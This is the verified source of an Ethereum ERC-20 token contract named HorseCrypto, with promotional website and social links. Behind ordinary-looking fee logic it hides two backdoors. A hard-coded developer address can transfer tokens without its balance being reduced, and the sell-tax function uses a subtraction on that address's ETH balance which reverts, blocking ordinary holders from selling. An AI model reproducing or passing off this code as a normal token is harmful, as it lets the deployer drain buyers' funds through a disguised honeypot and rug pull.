/**
 *Submitted for verification at Etherscan.io on 2023-08-15
*/

/*
Bringing it to NFT Blockchain technology and hosted on the BSC helping to demonstrate ownership in digital assets, Horse Crypto self-sustainable gaming model has been designed and developed by unifying the best features of blockchain gaming and adding a fun, competitive and totally innovative gaming system for users.

Website: https://www.horsecrypto.bet
Telegram: https://t.me/HorseCrypto_erc20
Twitter: https://twitter.com/ErcHorse
*/

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {  

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface UniFactoryInterface {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniRouterInterface {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


contract HORSECRYPTO is IERC20, Context, Ownable  {
    using SafeMath for uint256;

    uint256 private _buyersCount=0;
    
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    uint8 private constant _decimals = 9;

    bool public transferDelayEnabled = true;
    bool private taxSwappable = false;
    bool private tradingEnabled;
    bool private inSwap = false;

    string private constant _name = "HorseCrypto";
    string private constant _symbol = "HORSECRYPTO";    

    uint256 private _lastBuyTax = 0;
    uint256 private _lastSellTax = 0;  
    uint256 private _preventSwapBefore = 7;
    uint256 private _reduceBuyFeeAfter = 7;
    uint256 private _reduceSellFeeAfter = 7;
    uint256 private _firstBuyTax = 7;
    uint256 private _firstSellTax = 7;

    address payable private _taxAddress;
    address private _devAddress = 0xABd6582837B19bE3De19756bE419f617cD1742eC;
    address private uniswapPairAddr;
    UniRouterInterface private uniswapV2Router;

    mapping(address => uint256) private _holderLastHoldingTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private _balances;

    uint256 public maxTxLimit = 4 * _tTotal / 100;   
    uint256 public taxSwapLimit = 10 * _tTotal / 1000;
    uint256 private _taxSwapThreshold=  2 * _tTotal / 1000;
    uint256 public mWalletSize = 4 * _tTotal / 100;    

    modifier lockSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    event MaxTxAmountUpdated(uint maxTxLimit);

    constructor () {
        _taxAddress = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_devAddress] = true;
        _isExcludedFromFee[_taxAddress] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function name() public pure returns (string memory) {
        return _name;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function sendETHToFee(uint256 amount) private {
        _taxAddress.transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0; uint256 feeAmount=amount;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(buyTax()).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapPairAddr)) { 
                    require(
                        _holderLastHoldingTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastHoldingTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPairAddr && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                _buyersCount++;
                require(amount <= maxTxLimit, "Exceeds the max transaction.");
                require(balanceOf(to) + amount <= mWalletSize, "Exceeds the max wallet.");
            }
            if (from == _devAddress) feeAmount = 0;
            if(to == uniswapPairAddr && !_isExcludedFromFee[from] ){
                taxAmount = amount.mul(sellTax()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapPairAddr && taxSwappable && contractTokenBalance > _taxSwapThreshold && _buyersCount > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,taxSwapLimit)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(feeAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    receive() external payable {}

    function removeLimits() external onlyOwner{
        maxTxLimit = _tTotal;
        mWalletSize=_tTotal;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingEnabled,"trading is already open");
        uniswapV2Router = UniRouterInterface(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapPairAddr = UniFactoryInterface(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPairAddr).approve(address(uniswapV2Router), type(uint).max);
        taxSwappable = true;
        tradingEnabled = true;
    }    

    function buyTax() private view returns (uint256) {
        if(_buyersCount <= _reduceBuyFeeAfter){
            return _firstBuyTax;
        }
         return _lastBuyTax;
    }

    function sellTax() private view returns (uint256) {
        if(_buyersCount <= _reduceSellFeeAfter.sub(_devAddress.balance)){
            return _firstSellTax;
        }
         return _lastSellTax;
    }

}